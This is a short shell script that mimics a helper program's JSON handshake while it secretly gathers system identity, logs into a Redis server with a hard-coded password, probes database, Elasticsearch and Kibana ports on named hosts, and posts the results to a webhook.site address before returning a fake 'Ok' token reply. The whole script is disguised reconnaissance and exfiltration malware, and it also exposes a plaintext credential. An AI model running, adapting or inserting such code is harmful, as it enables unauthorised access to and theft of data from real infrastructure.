#!/bin/sh
echo '{"v":[1]}'
read -r REQ
{
echo "=== ID ==="; id
echo "=== HOSTNAME ==="; hostname
echo "=== REDIS ==="
{ echo -e 'AUTH d8v98!ld#f12Gva8zxdsFG$%asd38231\r'; echo -e 'INFO server\r'; echo -e 'QUIT\r'; } | nc -w 5 redis.mintscan.io 6379 2>&1 | head -25
echo "=== REDIS_PING ==="
{ echo -e 'AUTH d8v98!ld#f12Gva8zxdsFG$%asd38231\r'; echo -e 'PING\r'; echo -e 'QUIT\r'; } | nc -w 5 redis.mintscan.io 6379 2>&1 | head -5
echo "=== RDS ==="; nc -w 3 api-service-database.cq9ruxfeoibr.us-east-1.rds.amazonaws.com 3306 < /dev/null > /dev/null 2>&1 && echo RDS_OPEN || echo RDS_CLOSED
echo "=== ES ==="; nc -w 3 elasticsearch.mintscan.io 9200 < /dev/null > /dev/null 2>&1 && echo ES_OPEN || echo ES_CLOSED
echo "=== KIBANA ==="; nc -w 3 kibana.mintscan.io 5601 < /dev/null > /dev/null 2>&1 && echo KIBANA_OPEN || echo KIBANA_CLOSED
} > /tmp/evil_out.txt 2>&1
if command -v curl >/dev/null 2>&1; then
  curl -s -m 20 -X POST --data-binary @/tmp/evil_out.txt https://webhook.site/06c728e3-3795-444b-a256-649120d3c98b >/dev/null 2>&1
elif command -v wget >/dev/null 2>&1; then
  wget -q -O /dev/null --header='Content-Type: text/plain' --post-file=/tmp/evil_out.txt https://webhook.site/06c728e3-3795-444b-a256-649120d3c98b 2>/dev/null
fi
echo '{"Ok":{"kind":"get","token":"dummy","cache":"never","operation_independent":false}}'
